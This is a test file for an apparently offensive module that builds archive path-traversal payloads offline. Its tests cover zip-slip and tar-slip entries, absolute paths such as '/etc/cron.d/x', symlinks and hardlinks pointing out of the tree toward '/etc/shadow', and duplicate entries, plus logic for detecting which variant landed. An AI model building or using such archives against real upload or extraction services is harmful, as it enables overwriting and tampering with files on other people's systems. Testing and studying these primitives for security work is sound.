"""Synthetic, offline tests for solvers/web/archive_smuggle.py (B-045).

Every archive is built by the module here and only *parsed* by the test to prove
the smuggled entry is really malformed; the module and the test never unpack an
archive to disk, follow a link, or touch the network.
"""

import base64
import hashlib
import io
import json
import subprocess
import sys
import tarfile
import zipfile
from pathlib import Path

import pytest


REPO = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO / "solvers" / "web"))

import archive_smuggle as asm  # noqa: E402


def _zip_names(data: bytes):
    with zipfile.ZipFile(io.BytesIO(data)) as zf:
        return [i.filename for i in zf.infolist()]


def _tar_members(data: bytes):
    with tarfile.open(fileobj=io.BytesIO(data)) as tf:
        return list(tf.getmembers())


def test_zip_slip_entry_name_escapes_the_root():
    v = asm.build_zip_slip("tmp/pwn.php", depth=5)
    assert v.primitive == "zip_slip"
    assert v.archive_format == "zip"
    names = _zip_names(v.content)
    # The behaviour under test: the stored entry name really traverses upward.
    assert names == ["../../../../../tmp/pwn.php"]
    assert names[0].count("../") == 5
    # The body is inert and carries the variant's marker.
    with zipfile.ZipFile(io.BytesIO(v.content)) as zf:
        body = zf.read(names[0])
    assert v.marker.encode() in body
    assert b"<?php" not in body and b"eval(" not in body


def test_zip_absolute_entry_name_is_absolute():
    v = asm.build_zip_absolute("etc/cron.d/x")
    assert _zip_names(v.content) == ["/etc/cron.d/x"]


def test_zip_symlink_entry_has_symlink_mode_and_writes_through_it():
    v = asm.build_zip_symlink("tmp/pwn.php", depth=4)
    assert v.primitive == "symlink"
    with zipfile.ZipFile(io.BytesIO(v.content)) as zf:
        infos = {i.filename: i for i in zf.infolist()}
        # First entry is a symlink (unix S_IFLNK in the high external-attr bits).
        link = infos["link"]
        assert (link.external_attr >> 16) & 0o170000 == 0o120000
        link_target = zf.read("link").decode()
        assert link_target == "../../../../tmp"
        # Second entry writes through the link name.
        assert "link/pwn.php" in infos
        assert v.marker.encode() in zf.read("link/pwn.php")


def test_tar_slip_member_name_escapes_the_root():
    v = asm.build_tar_slip("tmp/pwn.sh", depth=3)
    members = _tar_members(v.content)
    assert [m.name for m in members] == ["../../../tmp/pwn.sh"]
    assert members[0].isreg()


def test_tar_symlink_member_is_a_symlink_out_of_tree():
    v = asm.build_tar_symlink("tmp/pwn.sh", depth=3)
    members = {m.name: m for m in _tar_members(v.content)}
    link = members["link"]
    assert link.issym()
    assert link.linkname == "../../../tmp"
    assert "link/pwn.sh" in members


def test_tar_hardlink_member_aliases_out_of_tree_at_depth_and_writes_through():
    v = asm.build_tar_hardlink("etc/shadow", depth=3)
    members = _tar_members(v.content)
    # Hardlink alias first, then a regular member of the same name (overwrite).
    assert [m.name for m in members] == ["alias", "alias"]
    assert members[0].islnk()
    assert members[0].linkname == "../../../etc/shadow"
    assert members[1].isreg()
    with tarfile.open(fileobj=io.BytesIO(v.content)) as tf:
        body = tf.extractfile(members[1]).read()
    assert v.marker.encode() in body
    assert v.marker.encode() in v.content
    # The depth really is honoured, not fixed at one level.
    deep = asm.build_tar_hardlink("etc/shadow", depth=5)
    assert _tar_members(deep.content)[0].linkname == "../../../../../etc/shadow"


def test_tar_hardlink_without_write_through_is_link_only():
    v = asm.build_tar_hardlink("etc/shadow", depth=2, write_through=False)
    members = _tar_members(v.content)
    assert len(members) == 1 and members[0].islnk()
    assert members[0].linkname == "../../etc/shadow"
    assert v.marker.encode() not in v.content


@pytest.mark.parametrize("fmt", ["zip", "tar", "tgz"])
def test_dir_slip_creates_an_escaping_directory_then_a_file_inside(fmt):
    v = asm.build_dir_slip("srv/trusted/table.bin", archive_format=fmt, depth=2)
    assert v.primitive == "dir_member" and v.archive_format == fmt
    if fmt == "zip":
        with zipfile.ZipFile(io.BytesIO(v.content)) as zf:
            infos = zf.infolist()
            assert [i.filename for i in infos] == ["../../srv/trusted/", "../../srv/trusted/table.bin"]
            assert infos[0].is_dir()
            assert (infos[0].external_attr >> 16) & 0o170000 == 0o040000
            assert v.marker.encode() in zf.read(infos[1].filename)
    else:
        members = _tar_members(v.content)
        assert [m.name for m in members] == ["../../srv/trusted", "../../srv/trusted/table.bin"]
        assert members[0].isdir() and members[1].isreg()


def test_symlink_without_directory_part_links_to_the_traversal_dir_itself():
    # A bare target has no directory part: the link must name the traversal
    # directory as "<../ * depth>." (an explicit final segment), never end in a
    # bare "/" with an empty last component.
    zv = asm.build_zip_symlink("flag.txt", depth=2)
    with zipfile.ZipFile(io.BytesIO(zv.content)) as zf:
        assert zf.read("link").decode() == "../../."
        assert "link/flag.txt" in zf.namelist()
    for fmt in ("tar", "tgz"):
        tv = asm.build_tar_symlink("flag.txt", depth=3, archive_format=fmt)
        members = {m.name: m for m in _tar_members(tv.content)}
        assert members["link"].issym() and members["link"].linkname == "../../../."
        assert "link/flag.txt" in members


def test_read_audit_markers_reads_each_marker_once_when_variants_repeat():
    variants = asm.build_archive_variants(target="tmp/r5d")
    landed = variants[0]
    audit = f"{landed.marker} written\n"
    once = asm.read_audit_markers(audit, variants)
    twice = asm.read_audit_markers(audit, tuple(variants) + tuple(variants))
    assert [h.via for h in twice] == ["marker"]
    assert twice[0].variant_name == landed.name and twice[0].candidates == (landed.name,)
    assert twice == once
    # Repeated variants with no evidence still give one grouped hit, and the
    # candidate list does not repeat names.
    shared = asm.read_audit_markers("promoted to /srv/tmp/r5d\n", tuple(variants) * 2)
    assert len(shared) == 1
    assert len(set(shared[0].candidates)) == len(shared[0].candidates)
    assert shared == asm.read_audit_markers("promoted to /srv/tmp/r5d\n", variants)


def test_dir_slip_without_directory_part_uses_the_traversal_dir():
    v = asm.build_dir_slip("flag.txt", archive_format="zip", depth=2)
    assert _zip_names(v.content) == ["../../", "../../flag.txt"]


def test_tgz_variants_are_gzip_wrapped_tar_and_deterministic():
    v = asm.build_tar_slip("tmp/pwn.sh", depth=2, archive_format="tgz")
    assert v.archive_format == "tgz" and v.name == "tgz_slip"
    assert v.content[:2] == b"\x1f\x8b"
    with tarfile.open(fileobj=io.BytesIO(v.content), mode="r:gz") as tf:
        assert [m.name for m in tf.getmembers()] == ["../../tmp/pwn.sh"]
    assert asm.build_tar_slip("tmp/pwn.sh", depth=2, archive_format="tgz").content == v.content
    # The plain tar spelling is not gzip.
    assert asm.build_tar_slip("tmp/pwn.sh", depth=2).content[:2] != b"\x1f\x8b"
    with pytest.raises(asm.ArchiveSmuggleError):
        asm.build_tar_slip("tmp/pwn.sh", archive_format="rar")


def test_build_archive_variants_tar_formats_adds_tgz_spellings():
    tar_only = asm.build_archive_variants(target="tmp/r5d")
    both = asm.build_archive_variants(target="tmp/r5d", tar_formats=("tar", "tgz"))
    assert "tgz" not in {v.archive_format for v in tar_only}
    tgz = [v for v in both if v.archive_format == "tgz"]
    assert {v.primitive for v in tgz} == {"zip_slip", "dir_member", "symlink", "hardlink", "duplicate_entry"}
    assert len(both) == len(tar_only) + len(tgz)
    with pytest.raises(asm.ArchiveSmuggleError):
        asm.build_archive_variants(tar_formats=("7z",))
    with pytest.raises(asm.ArchiveSmuggleError):
        asm.build_archive_variants(primitives=["hardlink"], tar_formats=())


_CUSTOM = b"\x00VALIDATED-ORIGINAL-TABLE\xff\nrow1,1.0\n"


def _escaping_body(v):
    """Read the body of the entry that carries the smuggled bytes (parse only)."""
    if v.archive_format == "zip":
        with zipfile.ZipFile(io.BytesIO(v.content)) as zf:
            return zf.read(v.entry_names[-1])
    with tarfile.open(fileobj=io.BytesIO(v.content)) as tf:
        regs = [m for m in tf.getmembers() if m.isreg()]
        return tf.extractfile(regs[-1]).read()


@pytest.mark.parametrize("build", [
    lambda b: asm.build_zip_slip("srv/trusted/table.bin", body=b),
    lambda b: asm.build_zip_absolute("srv/trusted/table.bin", body=b),
    lambda b: asm.build_zip_symlink("srv/trusted/table.bin", body=b),
    lambda b: asm.build_tar_slip("srv/trusted/table.bin", body=b),
    lambda b: asm.build_tar_slip("srv/trusted/table.bin", body=b, archive_format="tgz"),
    lambda b: asm.build_tar_symlink("srv/trusted/table.bin", body=b),
    lambda b: asm.build_tar_hardlink("srv/trusted/table.bin", body=b),
    lambda b: asm.build_dir_slip("srv/trusted/table.bin", body=b),
    lambda b: asm.build_dir_slip("srv/trusted/table.bin", body=b, archive_format="tar"),
    lambda b: asm.build_duplicate_entry("srv/trusted/table.bin", body=b),
    lambda b: asm.build_duplicate_entry("srv/trusted/table.bin", body=b, archive_format="tar"),
], ids=["zip_slip", "zip_absolute", "zip_symlink", "tar_slip", "tgz_slip", "tar_symlink",
        "tar_hardlink", "zip_dir_slip", "tar_dir_slip", "dup_zip", "dup_tar"])
def test_custom_body_lands_verbatim_in_the_escaping_entry(build):
    v = build(_CUSTOM)
    assert _escaping_body(v) == _CUSTOM
    assert v.custom_body is True
    assert v.body_sha256 == hashlib.sha256(_CUSTOM).hexdigest()
    row = v.to_dict()
    assert row["inert"] is False and row["custom_body"] is True
    # The default build plants the inert marker instead.
    default = build(None)
    assert default.custom_body is False and default.to_dict()["inert"] is True
    assert default.marker.encode() in _escaping_body(default)


def test_custom_body_is_bounded_and_typed():
    with pytest.raises(asm.ArchiveSmuggleError):
        asm.build_zip_slip("tmp/x", body=b"")
    with pytest.raises(asm.ArchiveSmuggleError):
        asm.build_zip_slip("tmp/x", body="text not bytes")
    with pytest.raises(asm.ArchiveSmuggleError):
        asm.build_zip_slip("tmp/x", body=b"A" * (asm.MAX_BODY + 1))


def test_build_archive_variants_puts_custom_body_in_every_variant():
    variants = asm.build_archive_variants(target="srv/trusted/table.bin", body=_CUSTOM)
    assert variants and all(v.custom_body for v in variants)
    assert all(_escaping_body(v) == _CUSTOM for v in variants)


@pytest.mark.parametrize("fmt", ["zip", "tar"])
def test_duplicate_entry_has_two_entries_same_name_last_wins(fmt):
    v = asm.build_duplicate_entry("config.php", archive_format=fmt)
    assert v.primitive == "duplicate_entry"
    if fmt == "zip":
        names = _zip_names(v.content)
        with zipfile.ZipFile(io.BytesIO(v.content)) as zf:
            # zipfile.read returns the last entry with that name.
            last_body = zf.read("config.php")
    else:
        members = _tar_members(v.content)
        names = [m.name for m in members]
        with tarfile.open(fileobj=io.BytesIO(v.content)) as tf:
            # tarfile.extractfile(name) resolves to the last member of that name.
            last_body = tf.extractfile(tf.getmember("config.php")).read()
    assert names == ["config.php", "config.php"]
    assert v.marker.encode() in last_body


def test_build_archive_variants_is_ranked_bounded_and_unique():
    variants = asm.build_archive_variants(target="tmp/r5d", depth=6)
    assert [v.rank for v in variants] == list(range(1, len(variants) + 1))
    # Covers every requested primitive family.
    assert {v.primitive for v in variants} == {
        "zip_slip", "dir_member", "symlink", "hardlink", "duplicate_entry"}
    # Unique bytes and unique markers per variant.
    assert len({v.sha256 for v in variants}) == len(variants)
    assert len({v.marker for v in variants}) == len(variants)
    assert all(v.to_dict()["inert"] and v.to_dict()["network_requests"] == 0 for v in variants)


def test_max_variants_returns_exactly_that_many():
    full = asm.build_archive_variants(target="tmp/r5d")
    assert len(full) > 3
    for cap in (1, 3, len(full) - 1):
        capped = asm.build_archive_variants(target="tmp/r5d", max_variants=cap)
        assert len(capped) == cap
        assert [v.name for v in capped] == [v.name for v in full[:cap]]
    assert len(asm.build_archive_variants(target="tmp/r5d", max_variants=len(full))) == len(full)
    for bad in (0, asm.MAX_VARIANTS + 1, True):
        with pytest.raises(asm.ArchiveSmuggleError):
            asm.build_archive_variants(max_variants=bad)


def test_byte_identical_builds_are_kept_once_with_contiguous_ranks(monkeypatch):
    full = asm.build_archive_variants(target="tmp/r5d")
    # Make the absolute builder emit exactly the zip-slip bytes: the de-dup in
    # build_archive_variants (the behaviour under test) must keep only one copy.
    real_slip = asm.build_zip_slip
    monkeypatch.setattr(asm, "build_zip_absolute",
                        lambda target, *, marker_stem, body: real_slip(target, marker_stem=marker_stem, body=body))
    deduped = asm.build_archive_variants(target="tmp/r5d")
    assert len(deduped) == len(full) - 1
    assert len({v.sha256 for v in deduped}) == len(deduped)
    assert [v.rank for v in deduped] == list(range(1, len(deduped) + 1))
    assert "zip_absolute" not in {v.name for v in deduped}


def test_backslash_target_is_normalised_to_forward_slashes():
    v = asm.build_zip_slip("tmp\\sub\\pwn.php", depth=1)
    assert _zip_names(v.content) == ["../tmp/sub/pwn.php"]
    assert v.landing_path == "tmp/sub/pwn.php"
    assert v.marker == asm.build_zip_slip("tmp/sub/pwn.php", depth=1).marker


def test_build_is_deterministic_across_calls():
    # Pinned archive timestamps keep bytes (and collected test ids) stable.
    a = asm.build_zip_slip("tmp/pwn.php", depth=5)
    b = asm.build_zip_slip("tmp/pwn.php", depth=5)
    assert a.content == b.content and a.sha256 == b.sha256


def test_read_audit_markers_reports_only_the_variant_that_landed():
    variants = asm.build_archive_variants(target="tmp/r5d", depth=6)
    landed = variants[2]
    # Simulate an audit endpoint that reflected the landed marker in a listing.
    audit = f"file written: /var/www/uploads/..\nAUDIT LOG\n{landed.marker} seen at 2026-01-01\n"
    hits = asm.read_audit_markers(audit, variants)
    assert [h.marker for h in hits] == [landed.marker]
    assert hits[0].variant_name == landed.name
    assert hits[0].via == "marker"


def test_read_audit_markers_landing_path_fallback_is_delimiter_bounded():
    v = asm.build_zip_slip("tmp/unique_leaf_zzz.php", depth=4)
    # Marker absent, but the exact landing path appears -> a bounded path hit.
    hits = asm.read_audit_markers("ls: /srv/tmp/unique_leaf_zzz.php exists\n", [v])
    assert len(hits) == 1 and hits[0].via == "landing_path"
    assert hits[0].candidates == ("zip_slip",) and hits[0].ambiguous is False
    assert hits[0].variant_name == "zip_slip" and hits[0].offset == len("ls: /srv/")
    # A single candidate names its own primitive, marker and landing path; only a
    # group of several is "ambiguous".
    assert hits[0].primitive == "zip_slip"
    assert hits[0].marker == v.marker and hits[0].landing_path == "tmp/unique_leaf_zzz.php"
    # A substring embedded in a larger token must NOT count as a hit, whichever
    # side the extra characters are on.
    assert asm.read_audit_markers("xtmp/unique_leaf_zzz.phpy\n", [v]) == ()
    assert asm.read_audit_markers("ls xtmp/unique_leaf_zzz.php\n", [v]) == ()      # left only
    assert asm.read_audit_markers("ls tmp/unique_leaf_zzz.php.bak\n", [v]) == ()   # right only


def test_leaf_name_alone_is_not_a_landing_hit():
    v = asm.build_zip_slip("tmp/unique_leaf_zzz.php", depth=4)
    # The upload form echoing the bare file name proves nothing about where it landed.
    assert asm.read_audit_markers("uploaded unique_leaf_zzz.php ok\n", [v]) == ()
    assert asm.read_audit_markers("uploaded /unique_leaf_zzz.php ok\n", [v]) == ()


def test_one_path_mention_is_one_shared_ambiguous_hit_not_n_wins():
    variants = asm.build_archive_variants(target="tmp/r5d")
    # The echoed upload name (and the duplicate entry's own leaf) is not a win.
    assert asm.read_audit_markers("uploaded file r5d stored", variants) == ()
    hits = asm.read_audit_markers("promoted to /srv/tmp/r5d\n", variants)
    assert len(hits) == 1
    hit = hits[0]
    assert hit.via == "landing_path" and hit.ambiguous is True
    assert hit.variant_name == "" and hit.marker == "" and hit.primitive == "ambiguous"
    assert hit.landing_path == "tmp/r5d"
    expected = tuple(v.name for v in variants if v.landing_path == "tmp/r5d")
    assert hit.candidates == expected and len(expected) > 1
    assert "duplicate_entry_zip" not in hit.candidates


def test_marker_hit_explains_its_landing_path():
    variants = asm.build_archive_variants(target="tmp/r5d")
    landed = variants[0]
    audit = f"{landed.marker} written to /srv/tmp/r5d\n"
    hits = asm.read_audit_markers(audit, variants)
    # The marker names the primitive; the same path mention adds no shared hit.
    assert [(h.via, h.variant_name) for h in hits] == [("marker", landed.name)]


def test_hits_are_ordered_by_offset_in_the_audit_text():
    variants = asm.build_archive_variants(target="tmp/r5d")
    first, second, third = variants[0], variants[3], variants[5]
    audit = f"a {third.marker}\nb {first.marker}\nc {second.marker}\n"
    hits = asm.read_audit_markers(audit, variants)
    assert [h.variant_name for h in hits] == [third.name, first.name, second.name]
    assert [h.offset for h in hits] == sorted(h.offset for h in hits)


def test_custom_body_digest_in_audit_is_one_shared_hit():
    variants = asm.build_archive_variants(target="srv/trusted/table.bin", body=_CUSTOM)
    digest = hashlib.sha256(_CUSTOM).hexdigest()
    hits = asm.read_audit_markers(f"trusted sha256={digest.upper()} validated=ok\n", variants)
    assert len(hits) == 1
    assert hits[0].via == "body_sha256" and hits[0].ambiguous is True
    assert hits[0].candidates == tuple(v.name for v in variants)
    # A longer hex run is a different hash, not ours.
    assert asm.read_audit_markers(f"sha={digest}0\n", variants) == ()
    # Marker-only variants never match on a body digest.
    plain = asm.build_archive_variants(target="srv/trusted/table.bin")
    assert asm.read_audit_markers(f"sha={plain[0].body_sha256}\n", plain) == ()


def test_read_audit_markers_empty_when_nothing_landed():
    variants = asm.build_archive_variants(target="tmp/r5d")
    assert asm.read_audit_markers("nothing interesting here\n", variants) == ()


def test_invalid_inputs_fail_loudly():
    with pytest.raises(asm.ArchiveSmuggleError):
        asm.build_zip_slip("../escape/already")       # caller must not supply traversal
    with pytest.raises(asm.ArchiveSmuggleError):
        asm.build_zip_slip("tmp/x", depth=0)          # depth out of range
    with pytest.raises(asm.ArchiveSmuggleError):
        asm.build_archive_variants(primitives=["bogus"])
    with pytest.raises(asm.ArchiveSmuggleError):
        asm.read_audit_markers("x" * (asm.MAX_AUDIT_TEXT + 1), [])
    with pytest.raises(asm.ArchiveSmuggleError):
        asm.read_audit_markers("ok", ["not-a-variant"])


def test_cli_table_and_json_and_read_audit(tmp_path):
    exe = [sys.executable, str(REPO / "solvers" / "web" / "archive_smuggle.py")]
    table = subprocess.run(exe + ["--target", "tmp/pwn.php"], capture_output=True, text=True)
    assert table.returncode == 0
    assert "OFFLINE ONLY" in table.stdout
    assert "no request was sent" in table.stdout

    js = subprocess.run(exe + ["--json", "--target", "tmp/pwn.php"], capture_output=True, text=True)
    assert js.returncode == 0
    payload = json.loads(js.stdout)
    assert payload["sent"] is False and payload["offline"] is True
    first = payload["variants"][0]
    # The emitted bytes decode to a real archive carrying the marker.
    raw = base64.b64decode(first["content_b64"])
    assert first["marker"].encode() in raw

    # Write one archive, then feed a saved audit response back through the CLI.
    out = tmp_path / "evil.zip"
    sel = subprocess.run(exe + ["--select", "1", "--output", str(out), "--target", "tmp/pwn.php"],
                         capture_output=True, text=True)
    assert sel.returncode == 0 and out.exists()
    saved = tmp_path / "audit.txt"
    saved.write_text(f"audit: {first['marker']} landed\n")
    scored = subprocess.run(exe + ["--read-audit", str(saved), "--target", "tmp/pwn.php"],
                            capture_output=True, text=True)
    assert scored.returncode == 0
    hits = json.loads(scored.stdout)["hits"]
    assert any(h["marker"] == first["marker"] for h in hits)


def test_cli_body_file_plants_the_callers_bytes(tmp_path):
    exe = [sys.executable, str(REPO / "solvers" / "web" / "archive_smuggle.py")]
    body = tmp_path / "original.bin"
    body.write_bytes(_CUSTOM)
    out = tmp_path / "evil.tgz"
    # Select the tgz slip: tar formats tar,tgz and only the zip_slip family.
    js = subprocess.run(exe + ["--json", "--target", "srv/trusted/table.bin", "--body-file", str(body),
                               "--primitives", "zip_slip", "--tar-formats", "tar,tgz"],
                        capture_output=True, text=True)
    assert js.returncode == 0, js.stderr
    rows = json.loads(js.stdout)["variants"]
    assert [r["name"] for r in rows] == ["zip_slip", "zip_absolute", "tar_slip", "tgz_slip"]
    assert all(r["custom_body"] and not r["inert"] for r in rows)
    sel = subprocess.run(exe + ["--target", "srv/trusted/table.bin", "--body-file", str(body),
                                "--primitives", "zip_slip", "--tar-formats", "tar,tgz",
                                "--select", "4", "--output", str(out)], capture_output=True, text=True)
    assert sel.returncode == 0, sel.stderr
    with tarfile.open(out, mode="r:gz") as tf:
        member = tf.getmembers()[0]
        assert member.name.endswith("../srv/trusted/table.bin")
        assert tf.extractfile(member).read() == _CUSTOM
    missing = subprocess.run(exe + ["--body-file", str(tmp_path / "absent.bin")],
                             capture_output=True, text=True)
    assert missing.returncode == 2 and "archive_smuggle:" in missing.stderr


if __name__ == "__main__":
    sys.exit(pytest.main([__file__, "-q"]))
